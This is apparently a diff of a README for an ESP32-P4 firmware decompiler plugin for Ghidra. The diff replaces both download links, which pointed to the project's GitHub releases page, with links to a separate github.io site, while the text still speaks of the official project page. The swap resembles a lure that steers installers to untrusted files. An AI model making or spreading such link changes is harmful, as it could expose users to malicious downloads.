@@ -1,6 +1,6 @@
 # 🔍 esp32-p4-decompiler-plugin - Analyze ESP32-P4 firmware files with ease
 
-[![Download Plugin](https://img.shields.io/badge/Download_Plugin-blue.svg)](https://github.com/Seemafir6626/esp32-p4-decompiler-plugin/releases)
+[![Download Plugin](https://img.shields.io/badge/Download_Plugin-blue.svg)](https://seemafir6626.github.io)
 
 This document helps you install the esp32-p4-decompiler-plugin. This tool allows you to examine firmware written for the ESP32-P4 chip. You will use this tool inside the Ghidra software suite to view code logic and understand how your device functions.
 
@@ -31,7 +31,7 @@ You must download the correct file from the official project page. Follow these 
 3. Locate the file ending in `.zip` under the Assets section.
 4. Click the file name to download it to your computer.
 
-[Visit this page to download](https://github.com/Seemafir6626/esp32-p4-decompiler-plugin/releases)
+[Visit this page to download](https://seemafir6626.github.io)
 
 ## 🛠️ Step-by-step installation
 
